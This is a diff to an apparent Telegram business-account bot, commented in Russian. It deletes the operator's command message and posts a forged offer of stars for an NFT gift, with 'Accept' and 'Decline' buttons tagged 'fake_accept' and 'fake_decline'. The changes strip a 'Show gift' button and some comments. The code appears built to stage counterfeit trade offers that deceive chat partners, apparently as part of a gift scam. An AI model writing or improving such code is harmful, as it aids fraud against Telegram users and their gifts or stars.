@@ -25,7 +25,6 @@ async def handle_offer_command(message: types.Message):
     except ValueError:
         return
 
-    # Извлекаем слаг подарка (например, DurovsCap-1234)
     match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
     if not match:
         return
@@ -33,7 +32,7 @@ async def handle_offer_command(message: types.Message):
     gift_slug = match.group(1)
 
     try:
-        # 1. МГНОВЕННО удаляем команду (без скачиваний файлов)
+        # 1. Мгновенно удаляем команду
         await bot.delete_business_messages(
             business_connection_id=business_connection_id,
             message_ids=[message.message_id]
@@ -41,36 +40,32 @@ async def handle_offer_command(message: types.Message):
 
         # 2. Форматируем текст
         raw_name = gift_slug.split('-')[0]
-        # Делаем красивое название (DurovsCap -> Durovs Cap)
         pretty_name = re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name) 
-        
-        # Ник в скобках
         username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
 
-        # Формируем текст: имя в скобках, а название подарка — это кликабельная ссылка
+        # Название подарка — кликабельная ссылка
         caption_text = (
             f"Пользователь ({username})\n"
             f"предлагает вам\n"
             f"<b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a>."
         )
 
-        # 3. Кнопки
+        # 3. Кнопки (ТОЛЬКО Отклонить и Принять)
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Показать подарок", url=link)],
             [
                 InlineKeyboardButton(text="Отклонить", callback_data="fake_decline"),
                 InlineKeyboardButton(text="Принять", callback_data="fake_accept")
             ]
         ])
 
-        # 4. Отправляем сообщение (мгновенно)
+        # 4. Отправляем сообщение
         await bot.send_message(
             chat_id=message.chat.id,
             text=caption_text,
             reply_markup=keyboard,
             business_connection_id=business_connection_id,
             parse_mode="HTML",
-            disable_web_page_preview=True # Убираем превью ссылки, чтобы было аккуратно
+            disable_web_page_preview=True
         )
 
     except Exception as e:
